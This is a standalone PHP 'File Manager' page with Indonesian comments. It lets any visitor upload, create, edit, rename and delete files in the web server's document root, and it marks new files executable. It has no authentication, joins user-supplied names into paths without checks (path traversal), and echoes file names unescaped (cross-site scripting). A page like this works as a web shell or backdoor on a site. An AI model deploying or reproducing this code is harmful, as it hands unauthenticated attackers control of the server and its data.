<?php
$dir = $_SERVER['DOCUMENT_ROOT'] . '/'; // Ganti dengan path direktori yang sesuai

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'];

    switch ($action) {
        case 'rename':
            $oldName = $_POST['old_name'];
            $newName = $_POST['new_name'];
            renameFile($oldName, $newName);
            break;
        case 'delete':
            $file = $_POST['file'];
            deleteFile($file);
            break;
        case 'edit':
            $fileToEdit = $_POST['file_to_edit'];
            $newName = $_POST['new_name'];
            editFileName($fileToEdit, $newName);
            break;
        case 'upload':
            handleFileUpload();
            break;
        case 'edit_content':
            $fileToEditContent = $_POST['file_to_edit_content'];
            $newContent = $_POST['new_content'];
            editFileContent($fileToEditContent, $newContent);
            break;
        case 'create':
            $newFileName = $_POST['new_file_name'];
            $newFileContent = $_POST['new_file_content'];
            createFile($newFileName, $newFileContent);
            break;
    }
}

function renameFile($oldName, $newName) {
    global $dir;
    $oldPath = $dir . '/' . $oldName;
    $newPath = $dir . '/' . $newName;

    if (file_exists($oldPath)) {
        if (rename($oldPath, $newPath)) {
            echo 'Nama file berhasil diubah.';
        } else {
            echo 'Gagal mengubah nama file.';
        }
    } else {
        echo 'File tidak ditemukan.';
    }
}

function deleteFile($fileName) {
    global $dir;
    $filePath = $dir . '/' . $fileName;

    if (file_exists($filePath)) {
        if (unlink($filePath)) {
            echo 'File berhasil dihapus.';
        } else {
            echo 'Gagal menghapus file.';
        }
    } else {
        echo 'File tidak ditemukan.';
    }
}

function editFileName($fileToEdit, $newName) {
    global $dir;
    $filePath = $dir . '/' . $fileToEdit;
    $newPath = $dir . '/' . $newName;

    if (file_exists($filePath)) {
        if (rename($filePath, $newPath)) {
            echo 'Nama file berhasil diubah.';
        } else {
            echo 'Gagal mengubah nama file.';
        }
    } else {
        echo 'File tidak ditemukan.';
    }
}

function handleFileUpload() {
    global $dir;

    $uploadDir = $dir;
    $uploadFile = $uploadDir . '/' . basename($_FILES['uploaded_file']['name']);

    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $uploadFile)) {
        echo 'File berhasil diunggah.';

        // Set izin CHMOD
        chmod($uploadFile, 0755);
    } else {
        echo 'Gagal mengunggah file.';
    }
}

function editFileContent($fileToEditContent, $newContent) {
    global $dir;
    $filePath = $dir . '/' . $fileToEditContent;

    if (file_exists($filePath)) {
        if (file_put_contents($filePath, $newContent) !== false) {
            echo 'Isi file berhasil diubah.';
        } else {
            echo 'Gagal mengubah isi file.';
        }
    } else {
        echo 'File tidak ditemukan.';
    }
}

function createFile($newFileName, $newFileContent) {
    global $dir;
    $filePath = $dir . '/' . $newFileName;

    if (!file_exists($filePath)) {
        if (file_put_contents($filePath, $newFileContent) !== false) {
            echo 'File baru berhasil dibuat.';
        } else {
            echo 'Gagal membuat file baru.';
        }

        // Set izin CHMOD
        chmod($filePath, 0755);
    } else {
        echo 'File dengan nama yang sama sudah ada.';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        h2 {
            text-align: center;
            color: #333;
        }

        table {
            width: 80%;
            border-collapse: collapse;
            margin: 20px auto;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }

        th {
            background-color: #f2f2f2;
        }

        .hidden {
            display: none;
        }

        form {
            display: inline-block;
            margin-left: 10px;
        }

        input[type="text"], input[type="submit"], input[type="file"], textarea {
            padding: 8px;
            margin: 2px;
            display: block;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <h2>File Manager</h2>

    <?php
    if (is_dir($dir)) {
        if ($dh = opendir($dir)) {
            echo '<table>';
            echo '<tr><th>File Name</th><th>Action</th></tr>';
            while (($file = readdir($dh)) !== false) {
                if ($file != '.' && $file != '..' && is_file($dir . '/' . $file)) {
                    echo '<tr>';
                    echo '<td>' . $file . '</td>';
                    echo '<td>
                            <form method="post" action="">
                                <input type="hidden" name="old_name" value="' . $file . '">
                                <input type="text" name="new_name" class="hidden" placeholder="New Name">
                                <input type="hidden" name="action" value="rename">
                                <input type="submit" value="Rename" class="hidden">
                            </form>
                            <form method="post" action="">
                                <input type="hidden" name="file" value="' . $file . '">
                                <input type="hidden" name="action" value="delete">
                                <input type="submit" value="Delete">
                            </form>
                            <form method="post" action="">
                                <input type="hidden" name="file_to_edit" value="' . $file . '">
                                <input type="text" name="new_name" placeholder="Edit Name">
                                <input type="hidden" name="action" value="edit">
                                <input type="submit" value="Edit">
                            </form>
                            <form method="post" action="">
                                <input type="hidden" name="file_to_edit_content" value="' . $file . '">
                                <textarea name="new_content" placeholder="Edit Content"></textarea>
                                <input type="hidden" name="action" value="edit_content">
                                <input type="submit" value="Edit Content">
                            </form>
                          </td>';
                    echo '</tr>';
                }
            }
            echo '</table>';
            closedir($dh);
        }
    } else {
        echo "Not a valid directory";
    }
    ?>

    <h2>Upload File</h2>
    <form method="post" action="" enctype="multipart/form-data">
        <input type="file" name="uploaded_file">
        <input type="hidden" name="action" value="upload">
        <input type="submit" value="Upload">
    </form>

    <h2>Create New File</h2>
    <form method="post" action="">
        <input type="text" name="new_file_name" placeholder="New File Name">
        <textarea name="new_file_content" placeholder="New File Content"></textarea>
        <input type="hidden" name="action" value="create">
        <input type="submit" value="Create File">
    </form>
</body>
</html>
